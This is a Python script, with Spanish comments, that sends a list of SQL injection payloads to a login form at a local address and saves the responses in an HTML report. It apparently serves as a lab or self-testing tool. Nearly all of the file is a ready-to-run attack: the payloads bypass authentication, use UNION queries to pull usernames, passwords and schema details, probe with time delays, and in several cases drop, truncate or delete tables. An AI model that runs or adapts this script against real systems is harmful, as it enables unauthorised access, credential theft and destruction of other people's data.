import requests
import os

url = "http://127.0.0.1:8000/login"  

payloads = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "' OR 1=1#",
    "' OR '1'='1'#",
    "' OR 1=1/*",
    "admin'--",
    "admin' #",
    "' OR ''='",
    "' OR 1=1 LIMIT 1 OFFSET 1 --",
    "' OR 1=1 LIMIT 1,1 --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1, username, password FROM users --",
    "' UNION SELECT table_name, column_name FROM information_schema.columns --",
    "' UNION SELECT NULL, database() --",
    "' UNION SELECT NULL, version() --",
    "' AND LENGTH(database()) > 0 --",
    "' OR ASCII(SUBSTRING((SELECT database()),1,1)) = 109 --",
    "' UNION SELECT NULL, @@version --",
    "' OR 1=CAST((SELECT COUNT(*) FROM users) AS INT) --",
    "' AND EXISTS(SELECT * FROM users WHERE username='admin') --",
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SLEEP(5); --",
    "' OR SLEEP(3)#",
    "'; SELECT pg_sleep(5); --",
    "' UNION SELECT 'a','b','c' --",
    "' OR 'a' = 'a",
    "1 OR 1=1",
    "1' OR '1' = '1",
    "' OR 'a' LIKE '%a%' --",
    "'; DROP TABLE users; --",
    "'; TRUNCATE TABLE users; --",
    "'; DELETE FROM users WHERE 'a'='a --",
    "'; DROP TABLE productos; --",
    "'/*!50000UNION*/ SELECT NULL,NULL--",
    "'||'1'='1",
    "'+' OR 1=1 --",
    "' OR 1=1; --",
    "') OR ('1'='1",
    "') OR 1=1 --",
    "') OR '1'='1",
    "' AND 1=0 UNION SELECT 'a','b' --",
    "' OR NOT 1=0 --",
    "' AND 1=CAST((SELECT @@version) AS INT) --",
    "' OR 1=1-- -",
    "' OR 1=1--+",
    "' OR 1=1#",
    "' OR 1=1;%00",
    "' OR 1=1--%0A",
]

results = []

for payload in payloads:
    data = {
        "username": payload,  
        "password": "test"    
    }

    print(f"Probando payload: {payload}")
    try:
        r = requests.post(url, data=data, timeout=5)
        status = r.status_code
        content_length = len(r.text)
        print(f"→ Status: {status} | Contenido: {content_length} bytes\n")
        results.append((payload, status, content_length))
    except requests.exceptions.RequestException as e:
        print(f"Error en la solicitud: {e}\n")
        results.append((payload, "Error", str(e)))

# Crear reporte HTML
html_content = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Reporte de SQL Injection</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:nth-child(even) { background-color: #fafafa; }
    </style>
</head>
<body>
    <h1>Reporte de Pruebas SQL Injection</h1>
    <table>
        <thead>
            <tr>
                <th>Payload</th>
                <th>Status</th>
                <th>Contenido (bytes)</th>
            </tr>
        </thead>
        <tbody>
"""

for payload, status, content_length in results:
    html_content += f"""
            <tr>
                <td>{payload}</td>
                <td>{status}</td>
                <td>{content_length}</td>
            </tr>
    """

html_content += """
        </tbody>
    </table>
</body>
</html>
"""

folder = "reports"
if not os.path.exists(folder):
    os.makedirs(folder)

filename = os.path.join(folder, "reporte_sql_injection.html")
with open(filename, "w", encoding="utf-8") as f:
    f.write(html_content)

print(f"Reporte generado en {filename}")
